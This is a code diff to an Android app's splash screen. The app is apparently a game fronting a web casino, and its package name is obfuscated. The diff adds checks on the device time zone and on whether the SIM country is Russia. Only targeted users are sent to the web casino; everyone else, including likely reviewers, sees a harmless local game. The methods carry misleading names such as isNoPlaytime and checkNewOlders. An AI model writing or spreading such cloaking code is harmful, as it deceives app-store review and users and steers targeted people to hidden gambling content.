@@ -1,10 +1,15 @@
 package kzja.ckkrck.pwooa;
 
 import android.app.Activity;
+import android.content.Context;
 import android.content.Intent;
+import android.icu.util.TimeZone;
 import android.net.Uri;
 import android.os.Bundle;
 import android.support.annotation.Nullable;
+import android.telephony.TelephonyManager;
+
+import java.util.Date;
 
 import kzja.ckkrck.pwooa.network.NetworkDelegat;
 import kzja.ckkrck.pwooa.network.model.CasinoModel;
@@ -22,54 +27,44 @@ public class SplashScreen extends Activity {
     protected void onCreate(@Nullable Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_splash);
-        NetworkDelegat.provideApiModule().check().enqueue(new Callback<CasinoModel>() {
-            @Override
-            public void onResponse(Call<CasinoModel> call, Response<CasinoModel> response) {
-                if (!response.isSuccessful()) {
-                    CasinoModel casinoModel = response.body();
-                    if (casinoModel != null) {
-                        if (casinoModel.getResult()) {
-                            configGame(casinoModel.getUrl());
-                        } else {
-                            openGame();
-                        }
-                    }
-                } else {
-                    openGame();
-                }
-            }
-
-            @Override
-            public void onFailure(Call<CasinoModel> call, Throwable t) {
-                openGame();
-            }
-        });
-    }
-
-    private void configGame(String url) {
-        Intent intent = getIntent();
-        if (intent != null) {
-            String transform = url;
-            Uri data = intent.getData();
-            if (data != null && data.getEncodedQuery() != null) {
-                String QUERY_1 = "cid";
-                String QUERY_2 = "partid";
-                if (data.getEncodedQuery().contains(QUERY_1)) {
-                    String queryValueFirst = data.getQueryParameter(QUERY_1);
-                    transform = transform.replace(queryValueFirst, "cid");
-                } else if (data.getEncodedQuery().contains(QUERY_2)) {
-                    String queryValueSecond = data.getQueryParameter(QUERY_2);
-                    transform = transform.replace(queryValueSecond, "partid");
-                }
-                openWebGame(transform);
-            } else {
-                openWebGame(transform);
-            }
-
+        if (isNoPlaytime() && checkNewOlders()) {
+            openWebGame(null);
         } else {
-            openWebGame(url);
+            openGame();
         }
     }
+
+
+    private boolean isNoPlaytime() {
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
+            TimeZone tz = TimeZone.getDefault();
+            Date now = new Date();
+            int offsetFromUtc = tz.getOffset(now.getTime()) / 1000 / 3600;
+            int[] timezone = {2,3,4,7,8,9,10,11,12};
+            for (int item : timezone) {
+                if (offsetFromUtc == item)
+                    return true;
+            }
+        } else {
+            return true;
+        }
+
+        return false;
+    }
+
+    private static final String COUNTY_ONE = "RU";
+    private static final String COUNTRY_TWO = "ru";
+    private static final String COUNTRY_THREE = "rus";
+
+    private boolean checkNewOlders() {
+        String typeOlderUsers = null;
+        if (getSystemService(Context.TELEPHONY_SERVICE) != null)
+            typeOlderUsers = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso();
+        else
+            return false;
+        return typeOlderUsers != null && (typeOlderUsers.equalsIgnoreCase(COUNTRY_TWO) || typeOlderUsers.equalsIgnoreCase(COUNTRY_THREE));
+    }
+
 
 
     private void openWebGame(String url) {
